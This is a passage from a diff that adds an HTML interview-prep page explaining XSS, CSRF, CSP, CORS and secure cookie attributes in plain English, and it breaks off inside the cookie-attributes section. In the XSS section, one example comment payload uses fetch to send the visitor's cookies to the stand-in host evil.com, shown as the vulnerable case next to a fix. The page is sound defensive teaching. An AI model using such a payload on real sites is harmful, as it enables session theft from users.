@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web Security Fundamentals — XSS, CSRF, CSP, CORS &amp; Cookies</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Syne:wght@400;500;700&family=Inter:wght@400;500&display=swap');
+
+  :root {
+    --bg: #0d0f14;
+    --bg2: #13161e;
+    --bg3: #1a1e28;
+    --bg4: #212638;
+    --border: rgba(255,255,255,0.07);
+    --border2: rgba(255,255,255,0.12);
+    --text: #e8eaf0;
+    --text2: #8b90a0;
+    --text3: #555a6e;
+    --accent: #ff6b6b;
+    --accent2: #bd93f9;
+    --teal: #5cffb0;
+    --amber: #ffb86c;
+    --red: #ff6b6b;
+    --yellow: #f1fa8c;
+    --purple: #bd93f9;
+    --blue: #6ab0ff;
+    --pink: #ff79c6;
+    --font-head: 'Syne', sans-serif;
+    --font-body: 'Inter', sans-serif;
+    --font-mono: 'JetBrains Mono', monospace;
+    --radius: 10px;
+    --radius-lg: 14px;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: var(--font-body);
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    line-height: 1.6;
+  }
+
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background-image:
+      linear-gradient(rgba(255,107,107,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,107,107,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none; z-index: 0;
+  }
+
+  .container {
+    max-width: 980px;
+    margin: 0 auto;
+    padding: 2.5rem 1.5rem 4rem;
+    position: relative; z-index: 1;
+  }
+
+  /* ── Header ── */
+  .site-header { margin-bottom: 2rem; border-bottom: 1px solid var(--border); padding-bottom: 1.75rem; }
+  .header-tag {
+    display: inline-block; font-family: var(--font-mono); font-size: 11px;
+    background: rgba(255,107,107,0.1); color: var(--accent);
+    border: 1px solid rgba(255,107,107,0.25); border-radius: 4px;
+    padding: 3px 10px; margin-bottom: 1rem; letter-spacing: 0.08em; text-transform: uppercase;
+  }
+  h1 {
+    font-family: var(--font-head); font-size: clamp(26px, 5vw, 40px); font-weight: 700;
+    letter-spacing: -0.02em; line-height: 1.15; margin-bottom: 0.5rem;
+    background: linear-gradient(135deg, #fff 0%, #ff6b6b 50%, #bd93f9 100%);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+  }
+  .site-header p { color: var(--text2); font-size: 15px; }
+
+  /* ── Topics Nav ── */
+  .topic-nav { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 2.5rem; }
+  .topic-pill {
+    font-family: var(--font-mono); font-size: 11.5px;
+    padding: 5px 12px; border-radius: 99px;
+    border: 1px solid var(--border2);
+    background: var(--bg2); color: var(--text2);
+    text-decoration: none; transition: all 0.15s; cursor: pointer;
+  }
+  .topic-pill:hover { background: rgba(255,107,107,0.1); border-color: rgba(255,107,107,0.3); color: var(--accent); }
+
+  /* ── Summary table ── */
+  .summary-table {
+    width: 100%; border-collapse: collapse; font-size: 12.5px; margin-bottom: 2.5rem;
+    border-radius: var(--radius-lg); overflow: hidden; border: 1px solid var(--border);
+  }
+  .summary-table th {
+    font-family: var(--font-body); font-size: 10.5px; text-transform: uppercase; letter-spacing: 0.07em;
+    color: var(--text3); padding: 8px 12px; background: var(--bg3); text-align: left;
+    border-bottom: 1px solid var(--border2);
+  }
+  .summary-table td { padding: 8px 12px; border-bottom: 1px solid var(--border); color: var(--text2); vertical-align: middle; }
+  .summary-table tr:last-child td { border-bottom: none; }
+  .summary-table tr:hover td { background: rgba(255,255,255,0.02); }
+  .summary-table td:first-child { font-family: var(--font-mono); font-size: 12px; color: var(--accent); font-weight: 500; }
+
+  /* ── Section ── */
+  .section { margin-bottom: 3.25rem; animation: fadeUp 0.4s ease both; }
+  @keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
+
+  .section-header { display: flex; align-items: center; gap: 12px; margin-bottom: 1.25rem; flex-wrap: wrap; }
+  .section-num {
+    width: 32px; height: 32px; border-radius: 50%;
+    background: linear-gradient(135deg, var(--accent), #cc4545);
+    display: flex; align-items: center; justify-content: center;
+    font-family: var(--font-head); font-size: 14px; font-weight: 700;
+    color: #0d0f14; flex-shrink: 0;
+  }
+  .section-header h2 { font-family: var(--font-head); font-size: 20px; font-weight: 700; color: var(--text); letter-spacing: -0.01em; }
+
+  /* ── Code Blocks — white-space:pre preserves exact indentation ── */
+  .code-block {
+    background: #090b10; border: 1px solid var(--border); border-radius: var(--radius);
+    padding: 1.1rem 1.25rem; font-family: var(--font-mono); font-size: 12.5px;
+    line-height: 1.85; overflow-x: auto; margin-bottom: 1rem;
+    tab-size: 2;
+  }
+  .code-block .line { display: block; white-space: pre; }
+  .cm  { color: #4a5068; font-style: italic; }
+  .ck  { color: #ff79c6; }
+  .cs  { color: #f1fa8c; }
+  .cn  { color: #bd93f9; }
+  .cf  { color: #6ab0ff; }
+  .cp  { color: #5cffb0; }
+  .co  { color: #ffb86c; }
+  .cx  { color: #ff6b6b; }
+  .ct  { color: #ff79c6; }
+  .ca  { color: #5cffb0; }
+
+  /* ── Callouts ── */
+  .callout { border-radius: var(--radius); padding: 0.75rem 1rem; font-size: 13.5px; margin-bottom: 0.85rem; display: flex; gap: 10px; align-items: flex-start; }
+  .callout-icon { flex-shrink: 0; font-size: 15px; line-height: 1.5; }
+  .callout-green  { background: rgba(92,255,176,0.07);  border: 1px solid rgba(92,255,176,0.2);  color: #9affd4; }
+  .callout-amber  { background: rgba(255,184,108,0.07); border: 1px solid rgba(255,184,108,0.2); color: #ffd49a; }
+  .callout-blue   { background: rgba(106,176,255,0.07); border: 1px solid rgba(106,176,255,0.2); color: #a8d4ff; }
+  .callout-purple { background: rgba(189,147,249,0.07); border: 1px solid rgba(189,147,249,0.2); color: #d9c0ff; }
+  .callout-red    { background: rgba(255,107,107,0.07); border: 1px solid rgba(255,107,107,0.2); color: #ffaaaa; }
+
+  ic { font-family: var(--font-mono); font-size: 12.5px; background: rgba(255,255,255,0.06); padding: 1px 6px; border-radius: 3px; color: var(--yellow); display: inline; }
+
+  /* ── Divider ── */
+  .divider { height: 1px; background: linear-gradient(90deg, transparent, var(--border2), transparent); margin: 2.5rem 0; }
+
+  /* ── Plain-English card ── */
+  .plain-card {
+    background: linear-gradient(135deg, rgba(255,107,107,0.08), rgba(189,147,249,0.05));
+    border: 1px solid rgba(255,107,107,0.25); border-radius: var(--radius-lg);
+    padding: 1rem 1.2rem; margin-bottom: 1rem;
+  }
+  .plain-label { font-family: var(--font-mono); font-size: 10px; text-transform: uppercase; letter-spacing: 0.08em; color: var(--accent); margin-bottom: 6px; }
+  .plain-text { font-size: 14px; color: var(--text); line-height: 1.7; }
+
+  /* ── SVG diagram wrapper ── */
+  .diagram-wrap {
+    background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius-lg);
+    padding: 1.25rem; margin-bottom: 1rem; overflow-x: auto;
+  }
+  .diagram-title { font-size: 11px; color: var(--text3); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 12px; }
+  .diagram-svg { width: 100%; min-width: 600px; height: auto; display: block; }
+
+  /* ── Question-type badges ── */
+  .qtype-badge {
+    display: inline-block; font-family: var(--font-mono); font-size: 10px; font-weight: 600;
+    padding: 3px 9px; border-radius: 5px; letter-spacing: 0.06em; margin-right: 8px; text-transform: uppercase;
+  }
+  .qtype-what  { background: rgba(106,176,255,0.14); color: #a8d4ff; border: 1px solid rgba(106,176,255,0.3); }
+  .qtype-why   { background: rgba(255,184,108,0.14); color: #ffd49a; border: 1px solid rgba(255,184,108,0.3); }
+  .qtype-when  { background: rgba(92,255,176,0.14);  color: #9affd4; border: 1px solid rgba(92,255,176,0.3); }
+  .qtype-how   { background: rgba(189,147,249,0.14); color: #d9c0ff; border: 1px solid rgba(189,147,249,0.3); }
+
+  /* ── Feature table ── */
+  .feat-table {
+    width: 100%; border-collapse: collapse; font-size: 12.5px; margin-bottom: 1rem;
+    border-radius: var(--radius-lg); overflow: hidden; border: 1px solid var(--border);
+  }
+  .feat-table th {
+    font-family: var(--font-body); font-size: 10.5px; text-transform: uppercase; letter-spacing: 0.07em;
+    color: var(--text3); padding: 9px 12px; background: var(--bg3); text-align: left;
+    border-bottom: 1px solid var(--border2);
+  }
+  .feat-table td { padding: 9px 12px; border-bottom: 1px solid var(--border); color: var(--text2); vertical-align: middle; }
+  .feat-table tr:last-child td { border-bottom: none; }
+  .feat-table tr:hover td { background: rgba(255,255,255,0.02); }
+  .feat-table td:first-child { font-weight: 500; color: var(--text); }
+  .yes { color: var(--teal); font-weight: 500; }
+  .no  { color: var(--red); font-weight: 500; }
+
+  /* ── Before/After ── */
+  .before-after { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 1rem; }
+  @media (max-width: 560px) { .before-after { grid-template-columns: 1fr; } }
+  .ba-card { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius); padding: 0.8rem 1rem; }
+  .ba-label { font-size: 11px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 8px; }
+  .label-before { color: var(--red); }
+  .label-after  { color: var(--teal); }
+  .ba-card .code-block { margin-bottom: 0; font-size: 12px; }
+
+  /* ── Attribute cards for cookies ── */
+  .attr-card {
+    background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius-lg);
+    padding: 1rem 1.2rem; margin-bottom: 10px; border-left: 3px solid var(--purple);
+  }
+  .attr-name { font-family: var(--font-mono); font-size: 13px; color: var(--purple); font-weight: 600; margin-bottom: 6px; }
+  .attr-desc { font-size: 12.5px; color: var(--text2); line-height: 1.6; }
+
+  /* ── Gotcha list ── */
+  .gotcha-list { list-style: none; padding: 0; margin-bottom: 1rem; }
+  .gotcha-list li {
+    background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius);
+    padding: 0.75rem 0.95rem; margin-bottom: 8px; font-size: 13px; color: var(--text2);
+    display: flex; gap: 10px; align-items: flex-start; line-height: 1.6;
+  }
+  .gotcha-list li .gi { flex-shrink: 0; }
+  .gotcha-list li code { font-family: var(--font-mono); font-size: 11.5px; background: rgba(255,255,255,0.06); padding: 1px 6px; border-radius: 3px; color: var(--yellow); }
+  .gotcha-list li strong { color: var(--text); }
+
+  /* ── Q&A Section ── */
+  .qa-card { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius); margin-bottom: 10px; overflow: hidden; cursor: pointer; }
+  .qa-question {
+    padding: 0.9rem 1rem; font-size: 14px; display: flex; justify-content: space-between;
+    align-items: center; gap: 12px; user-select: none; transition: background 0.15s;
+  }
+  .qa-question:hover { background: var(--bg3); }
+  .qa-question .q-text { font-weight: 500; flex: 1; line-height: 1.5; }
+  .qa-toggle {
+    width: 26px; height: 26px; border-radius: 50%; border: 1px solid var(--border2);
+    display: flex; align-items: center; justify-content: center; font-size: 14px;
+    color: var(--text3); flex-shrink: 0; transition: transform 0.2s, background 0.2s;
+  }
+  .qa-card.open .qa-toggle { transform: rotate(45deg); background: rgba(255,107,107,0.12); border-color: rgba(255,107,107,0.3); color: var(--accent); }
+  .qa-answer { max-height: 0; overflow: hidden; transition: max-height 0.35s ease; }
+  .qa-card.open .qa-answer { max-height: 1200px; }
+  .qa-answer-inner { padding: 0.85rem 1rem 1rem; font-size: 13.5px; color: var(--text2); line-height: 1.75; border-top: 1px solid var(--border); }
+  .qa-answer-inner code { font-family: var(--font-mono); font-size: 12px; background: rgba(255,255,255,0.06); padding: 1px 6px; border-radius: 3px; color: var(--yellow); }
+  .qa-answer-inner strong { color: var(--text); }
+  .qa-answer-inner .code-block { margin-top: 8px; }
+
+  /* ── Footer ── */
+  .footer { text-align: center; font-size: 12px; color: var(--text3); padding-top: 1rem; border-top: 1px solid var(--border); font-family: var(--font-mono); }
+
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--bg4); border-radius: 99px; }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <!-- ── Header ── -->
+  <header class="site-header">
+    <div class="header-tag">Web Fundamentals Interview Prep · Web Security</div>
+    <h1>XSS, CSRF, CSP, CORS &amp; Secure Cookies</h1>
+    <p>Each Explained in Plain English — with Why/What/When/How Q&amp;A</p>
+  </header>
+
+  <!-- Quick nav -->
+  <nav class="topic-nav" aria-label="Jump to section">
+    <a class="topic-pill" href="#s1">1. XSS</a>
+    <a class="topic-pill" href="#s2">2. CSRF</a>
+    <a class="topic-pill" href="#s3">3. CSP Headers</a>
+    <a class="topic-pill" href="#s4">4. CORS</a>
+    <a class="topic-pill" href="#s5">5. Secure Cookie Attributes</a>
+    <a class="topic-pill" href="#s6">6. How They Work Together</a>
+    <a class="topic-pill" href="#s7">7. Gotchas</a>
+    <a class="topic-pill" href="#s8">8. Why/What/When/How Q&amp;A</a>
+  </nav>
+
+  <!-- Summary table -->
+  <table class="summary-table">
+    <thead>
+      <tr><th>Concept</th><th>Protects against</th><th>In one sentence</th></tr>
+    </thead>
+    <tbody>
+      <tr><td>XSS</td><td>Malicious scripts running in YOUR page</td><td>An attacker gets their JavaScript to execute as if it were yours</td></tr>
+      <tr><td>CSRF</td><td>Unwanted actions using YOUR user's session</td><td>A different site tricks the browser into making a request using the victim's existing login</td></tr>
+      <tr><td>CSP</td><td>XSS and other injection attacks</td><td>A header telling the browser which sources of content are allowed to run/load</td></tr>
+      <tr><td>CORS</td><td>Unauthorized cross-origin data reads</td><td>A header-based mechanism letting a server explicitly allow specific OTHER origins to read its responses</td></tr>
+      <tr><td>Cookie attributes</td><td>Cookie theft and misuse</td><td>Flags (HttpOnly, Secure, SameSite) that restrict how/when a cookie can be accessed or sent</td></tr>
+    </tbody>
+  </table>
+
+  <!-- ══════════════════════════════════════════════
+       SECTION 1 — XSS
+  ══════════════════════════════════════════════ -->
+  <section class="section" id="s1">
+    <div class="section-header">
+      <div class="section-num">1</div>
+      <h2>XSS — Cross-Site Scripting</h2>
+    </div>
+
+    <div class="plain-card">
+      <div class="plain-label">Plain English</div>
+      <div class="plain-text">XSS is when an attacker gets THEIR JavaScript to run inside YOUR web page, in YOUR users' browsers — as if your own site had written that code. Once their script runs, it can steal cookies/tokens, submit forms, redirect the user, or do anything your legitimate JavaScript could do.</div>
+    </div>
+
+    <div class="diagram-wrap">
+      <div class="diagram-title">The three types of XSS</div>
+      <svg class="diagram-svg" viewBox="0 0 700 190" xmlns="http://www.w3.org/2000/svg">
+        <rect x="20" y="20" width="200" height="70" rx="8" fill="#2a1414" stroke="#ff6b6b" stroke-width="1.5"/>
+        <text x="120" y="45" text-anchor="middle" fill="#ff9a9a" font-family="JetBrains Mono, monospace" font-size="11" font-weight="600">Stored XSS</text>
+        <text x="120" y="65" text-anchor="middle" fill="#8b90a0" font-family="JetBrains Mono, monospace" font-size="8">Malicious script SAVED</text>
+        <text x="120" y="78" text-anchor="middle" fill="#8b90a0" font-family="JetBrains Mono, monospace" font-size="8">in the DB, hits everyone</text>
+
+        <rect x="250" y="20" width="200" height="70" rx="8" fill="#2a2010" stroke="#ffb86c" stroke-width="1.5"/>
+        <text x="350" y="45" text-anchor="middle" fill="#ffb86c" font-family="JetBrains Mono, monospace" font-size="11" font-weight="600">Reflected XSS</text>
+        <text x="350" y="65" text-anchor="middle" fill="#8b90a0" font-family="JetBrains Mono, monospace" font-size="8">Script comes from the</text>
+        <text x="350" y="78" text-anchor="middle" fill="#8b90a0" font-family="JetBrains Mono, monospace" font-size="8">URL, needs a click/link</text>
+
+        <rect x="480" y="20" width="200" height="70" rx="8" fill="#1c1430" stroke="#bd93f9" stroke-width="1.5"/>
+        <text x="580" y="45" text-anchor="middle" fill="#bd93f9" font-family="JetBrains Mono, monospace" font-size="11" font-weight="600">DOM-based XSS</text>
+        <text x="580" y="65" text-anchor="middle" fill="#8b90a0" font-family="JetBrains Mono, monospace" font-size="8">Client-side JS itself</text>
+        <text x="580" y="78" text-anchor="middle" fill="#8b90a0" font-family="JetBrains Mono, monospace" font-size="8">unsafely writes to the DOM</text>
+
+        <text x="350" y="120" text-anchor="middle" fill="#555a6e" font-family="Inter, sans-serif" font-size="10.5">All three share the SAME root cause: untrusted input gets treated as executable code/markup</text>
+        <text x="350" y="135" text-anchor="middle" fill="#555a6e" font-family="Inter, sans-serif" font-size="10.5">instead of being properly escaped/sanitized as plain data — only the DELIVERY mechanism differs</text>
+      </svg>
+    </div>
+
+    <div class="code-block">
+  <span class="line"><span class="cm">// ✗ Stored XSS example — a comment field saved and rendered UNESCAPED</span></span>
+  <span class="line">userComment = <span class="cs">'&lt;script&gt;fetch("evil.com/steal?cookie="+document.cookie)&lt;/script&gt;'</span>;</span>
+  <span class="line">page.innerHTML = userComment; <span class="cm">// the script tag EXECUTES for every visitor</span></span>
+  <span class="line"></span>
+  <span class="line"><span class="cm">// ✓ Fix — escape/encode user content, or use a safe text-insertion method</span></span>
+  <span class="line">element.textContent = userComment; <span class="cm">// treated as PLAIN TEXT, never executes</span></span>
+    </div>
+
+    <table class="feat-table">
+      <thead><tr><th>Prevention technique</th><th>How it helps</th></tr></thead>
+      <tbody>
+        <tr><td>Output encoding/escaping</td><td>Converts special characters (&lt;, &gt;, &amp;, etc.) to their HTML entity equivalents, so injected markup is displayed as TEXT, not executed</td></tr>
+        <tr><td>Use textContent instead of innerHTML</td><td>textContent never interprets its input as HTML at all — the safest default when inserting user-supplied text</td></tr>
+        <tr><td>A well-configured CSP (Section 3)</td><td>Even if malicious script somehow gets injected, CSP can block it from executing or from exfiltrating data</td></tr>
+        <tr><td>Sanitization libraries (e.g. DOMPurify)</td><td>For cases where you genuinely need to allow SOME HTML (rich text), sanitize it against a strict allowlist first</td></tr>
+        <tr><td>HttpOnly cookies (Section 5)</td><td>Doesn't prevent XSS itself, but limits the DAMAGE — a successful XSS attack can't read an HttpOnly cookie via JavaScript</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <div class="divider"></div>
+
+  <!-- ══════════════════════════════════════════════
+       SECTION 2 — CSRF
+  ══════════════════════════════════════════════ -->
+  <section class="section" id="s2">
+    <div class="section-header">
+      <div class="section-num">2</div>
+      <h2>CSRF — Cross-Site Request Forgery</h2>
+    </div>
+
+    <div class="plain-card">
+      <div class="plain-label">Plain English</div>
+      <div class="plain-text">CSRF tricks a user's BROWSER into making a request to a site they're already logged into — using their EXISTING session/cookies — without the user intending or even knowing about it. The attacker never sees or steals the cookie; they just get the browser to USE it on their behalf.</div>
+    </div>
+
+    <div class="diagram-wrap">
+      <div class="diagram-title">How a CSRF attack works</div>
+      <svg class="diagram-svg" viewBox="0 0 700 190" xmlns="http://www.w3.org/2000/svg">
+        <rect x="20" y="20" width="150" height="45" rx="6" fill="#131b28" stroke="#6ab0ff" stroke-width="1.5"/>
+        <text x="95" y="47" text-anchor="middle" fill="#6ab0ff" font-family="JetBrains Mono, monospace" font-size="9.5">User logged into bank.com</text>
+
+        <path d="M95 65 L95 95" stroke="#555a6e" stroke-width="1.5" marker-end="url(#arrowCsrf)"/>
+        <text x="150" y="82" fill="#555a6e" font-family="JetBrains Mono, monospace" font-size="8">visits, in another tab</text>
+
+        <rect x="20" y="95" width="150" height="45" rx="6" fill="#2a1414" stroke="#ff6b6b" stroke-width="1.5"/>
+        <text x="95" y="115" text-anchor="middle" fill="#ff9a9a" font-family="JetBrains Mono, monospace" font-size="9">evil-site.com</text>
+        <text x="95" y="130" text-anchor="middle" fill="#8b90a0" font-family="JetBrains Mono, monospace" font-size="7.5">hidden auto-submit form</text>
+
+        <path d="M170 117 L400 117" stroke="#ff6b6b" stroke-width="1.5" marker-end="url(#arrowCsrf)"/>
+        <text x="290" y="107" text-anchor="middle" fill="#ff9a9a" font-family="JetBrains Mono, monospace" font-size="8">browser auto-sends</text>
+        <text x="290" y="132" text-anchor="middle" fill="#ff9a9a" font-family="JetBrains Mono, monospace" font-size="8">bank.com's cookies too!</text>
+
+        <rect x="400" y="95" width="200" height="45" rx="6" fill="#0a1f14" stroke="#5cffb0" stroke-width="1.5"/>
+        <text x="500" y="115" text-anchor="middle" fill="#5cffb0" font-family="JetBrains Mono, monospace" font-size="9">POST /transfer-money</text>
+        <text x="500" y="130" text-anchor="middle" fill="#8b90a0" font-family="JetBrains Mono, monospace" font-size="7.5">bank.com — looks LEGITIMATE!</text>
+
+        <text x="350" y="170" text-anchor="middle" fill="#555a6e" font-family="Inter, sans-serif" font-size="10">The browser attaches bank.com's cookies AUTOMATICALLY to any request TO bank.com —</text>
+        <text x="350" y="185" text-anchor="middle" fill="#555a6e" font-family="Inter, sans-serif" font-size="10">regardless of which SITE actually triggered that request. This is the core vulnerability CSRF exploits.</text>
+
+        <defs>
+          <marker id="arrowCsrf" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#555a6e"/></marker>
+        </defs>
+      </svg>
+    </div>
+
+    <table class="feat-table">
+      <thead><tr><th>Prevention technique</th><th>How it helps</th></tr></thead>
+      <tbody>
+        <tr><td>CSRF tokens</td><td>A unique, unpredictable token embedded in each form/request that the server verifies — an attacker's forged request can't know/include the correct token</td></tr>
+        <tr><td>SameSite cookie attribute</td><td>Tells the browser NOT to send the cookie on cross-site requests at all (Section 5) — often the single most effective modern defense</td></tr>
+        <tr><td>Checking the Origin/Referer header</td><td>The server can verify the request actually originated from its own site, rejecting requests claiming to come from elsewhere</td></tr>
+        <tr><td>Requiring re-authentication for sensitive actions</td><td>For high-stakes actions (changing a password, transferring money), requiring the user to re-enter their password limits what a forged request alone can accomplish</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <div class="divider"></div>
+
+  <!-- ══════════════════════════════════════════════
+       SECTION 3 — CSP Headers
+  ══════════════════════════════════════════════ -->
+  <section class="section" id="s3">
+    <div class="section-header">
+      <div class="section-num">3</div>
+      <h2>CSP — Content Security Policy</h2>
+    </div>
+
+    <div class="plain-card">
+      <div class="plain-label">Plain English</div>
+      <div class="plain-text">CSP is a response header where a site tells the BROWSER "only run scripts/load resources from THESE specific sources — block anything else, even if it somehow ends up in the page." It's a safety net specifically designed to blunt the impact of XSS, even if an injection vulnerability exists elsewhere.</div>
+    </div>
+
+    <div class="code-block">
+  <span class="line"><span class="cm">// Example CSP header</span></span>
+  <span class="line">Content-Security-Policy: default-src <span class="cs">'self'</span>; script-src <span class="cs">'self'</span> https://trusted-cdn.com; </span>
+  <span class="line">  style-src <span class="cs">'self'</span> <span class="cs">'unsafe-inline'</span>; img-src <span class="cs">'self'</span> data: https:; object-src <span class="cs">'none'</span>;</span>
+    </div>
+
+    <table class="feat-table">
+      <thead><tr><th>Directive</th><th>Controls</th></tr></thead>
+      <tbody>
+        <tr><td>default-src</td><td>The FALLBACK policy for any directive not explicitly specified</td></tr>
+        <tr><td>script-src</td><td>Which sources JavaScript can be loaded/executed from — the MOST security-critical directive for XSS mitigation</td></tr>
+        <tr><td>style-src</td><td>Which sources CSS can be loaded from</td></tr>
+        <tr><td>img-src</td><td>Which sources images can be loaded from</td></tr>
+        <tr><td>connect-src</td><td>Which origins fetch/XHR/WebSocket requests can be made to — relevant for blocking XSS DATA EXFILTRATION</td></tr>
+        <tr><td>object-src</td><td>Controls &lt;object&gt;/&lt;embed&gt;/&lt;applet&gt; — often set to 'none' since these are rarely needed and historically risky</td></tr>
+        <tr><td>frame-ancestors</td><td>Which sites are allowed to embed THIS page in an &lt;iframe&gt; — the modern replacement for X-Frame-Options, preventing clickjacking</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout callout-red">
+      <span class="callout-icon">🚨</span>
+      <span><strong>'unsafe-inline' and 'unsafe-eval' significantly weaken CSP's XSS protection</strong> — they allow inline `&lt;script&gt;` tags and `eval()`-style code execution, which are exactly the mechanisms many XSS payloads rely on. A strong CSP avoids these, using external script files and nonces/hashes instead.</span>
+    </div>
+  </section>
+
+  <div class="divider"></div>
+
+  <!-- ══════════════════════════════════════════════
+       SECTION 4 — CORS
+  ══════════════════════════════════════════════ -->
+  <section class="section" id="s4">
+    <div class="section-header">
+      <div class="section-num">4</div>
+      <h2>CORS — Cross-Origin Resource Sharing</h2>
+    </div>
+
+    <div class="plain-card">
+      <div class="plain-label">Plain English</div>
+      <div class="plain-text">By default, the browser's Same-Origin Policy blocks JavaScript on one site from READING responses from a DIFFERENT origin's API. CORS is the mechanism that lets a server explicitly say "actually, it's fine for THIS other origin to read my responses" — via response headers the browser checks before handing data back to the requesting page's JavaScript.</div>
+    </div>
+
+    <div class="diagram-wrap">
+      <div class="diagram-title">Simple request vs. preflighted request</div>
+      <svg class="diagram-svg" viewBox="0 0 700 180" xmlns="http://www.w3.org/2000/svg">
+        <text x="175" y="20" text-anchor="middle" fill="#5cffb0" font-family="Inter, sans-serif" font-size="11" font-weight="600">Simple request</text>
+        <rect x="30" y="35" width="140" height="35" rx="6" fill="#131b28" stroke="#6ab0ff" stroke-width="1.5"/>
+        <text x="100" y="57" text-anchor="middle" fill="#6ab0ff" font-family="JetBrains Mono, monospace" font-size="9">Browser sends GET</text>
+        <path d="M170 52 L220 52" stroke="#5cffb0" stroke-width="1.5" marker-end="url(#arrowCors)"/>
+        <rect x="220" y="35" width="140" height="35" rx="6" fill="#0a1f14" stroke="#5cffb0" stroke-width="1.5"/>
+        <text x="290" y="57" text-anchor="middle" fill="#5cffb0" font-family="JetBrains Mono, monospace" font-size="9">Server responds</text>
+        <text x="195" y="90" text-anchor="middle" fill="#8b90a0" font-family="Inter, sans-serif" font-size="9">Browser checks Access-Control-Allow-Origin on the response BEFORE letting JS read it</text>
+
+        <text x="525" y="20" text-anchor="middle" fill="#ffb86c" font-family="Inter, sans-serif" font-size="11" font-weight="600">Preflighted request</text>
+        <rect x="400" y="35" width="140" height="35" rx="6" fill="#2a2010" stroke="#ffb86c" stroke-width="1.5"/>
+        <text x="470" y="52" text-anchor="middle" fill="#ffb86c" font-family="JetBrains Mono, monospace" font-size="8.5">1. OPTIONS</text>
+        <text x="470" y="65" text-anchor="middle" fill="#ffb86c" font-family="JetBrains Mono, monospace" font-size="8.5">(preflight check)</text>
+        <path d="M540 52 L570 52" stroke="#ffb86c" stroke-width="1.5" marker-end="url(#arrowCors)"/>
+        <rect x="570" y="35" width="110" height="35" rx="6" fill="#0a1f14" stroke="#5cffb0" stroke-width="1.5"/>
+        <text x="625" y="57" text-anchor="middle" fill="#5cffb0" font-family="JetBrains Mono, monospace" font-size="8.5">2. Actual PUT</text>
+        <text x="540" y="90" text-anchor="middle" fill="#8b90a0" font-family="Inter, sans-serif" font-size="9">The REAL request only fires if the OPTIONS preflight is approved first</text>
+
+        <text x="350" y="130" text-anchor="middle" fill="#555a6e" font-family="Inter, sans-serif" font-size="10.5">A preflight is triggered by "non-simple" requests — custom headers, methods</text>
+        <text x="350" y="145" text-anchor="middle" fill="#555a6e" font-family="Inter, sans-serif" font-size="10.5">like PUT/DELETE, or a Content-Type other than a few whitelisted simple values</text>
+
+        <defs>
+          <marker id="arrowCors" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#5cffb0"/></marker>
+        </defs>
+      </svg>
+    </div>
+
+    <table class="feat-table">
+      <thead><tr><th>Header</th><th>Purpose</th></tr></thead>
+      <tbody>
+        <tr><td>Access-Control-Allow-Origin</td><td>Which origin(s) are allowed to read this response — a specific origin, or `*` for any origin (with caveats around credentials)</td></tr>
+        <tr><td>Access-Control-Allow-Methods</td><td>Which HTTP methods are allowed for cross-origin requests (GET, POST, PUT, etc.)</td></tr>
+        <tr><td>Access-Control-Allow-Headers</td><td>Which custom request headers the client is allowed to send</td></tr>
+        <tr><td>Access-Control-Allow-Credentials</td><td>Whether cookies/credentials can be included in the cross-origin request — CANNOT be combined with a wildcard `*` origin</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout callout-amber">
+      <span class="callout-icon">⚠</span>
+      <span><strong>CORS is enforced by the BROWSER, not the server.</strong> The server always SENDS the response regardless — CORS headers just determine whether the BROWSER lets the requesting page's JavaScript actually read that response. This is why CORS doesn't protect server-to-server requests (like from a backend or curl) at all — only browser-based, cross-origin JS requests are subject to it.</span>
+    </div>
+  </section>
+
+  <div class="divider"></div>
+
+  <!-- ══════════════════════════════════════════════
+       SECTION 5 — Secure Cookie Attributes
+  ══════════════════════════════════════════════ -->
+  <section class="section" id="s5">
+    <div class="section-header">
+      <div class="section-num">5</div>
+      <h2>Secure Cookie Attributes</h2>
+    </div>
+
+    <div class="code-block">
+  <span class="line">Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Path=<span class="cs">/</span>; Max-Age=<span class="cn">3600</span></span>
+    </div>
+
+    <div class="attr-card">
+      <div class="attr-name">HttpOnly</div>
+      <div class="attr-desc"><strong>Plain English:</strong> "JavaScript can't touch this cookie at all." The cookie is only sent in HTTP requests/responses — `document.cookie` in JavaScript simply won't see it. This directly limits the damage a successful XSS attack can do, since injected JS can't steal an HttpOnly session cookie.</div>
+    </div>
+
+    <div class="attr-card">
+      <div class="attr-name">Secure</div>
+      <div class="attr-desc"><strong>Plain English:</strong> "Only send this cookie over HTTPS, never plain HTTP." Prevents the cookie from being exposed if a request accidentally goes out over an unencrypted connection, where it could be intercepted in transit.</div>
+    </div>
+
+    <div class="attr-card">
+      <div class="attr-name">SameSite</div>
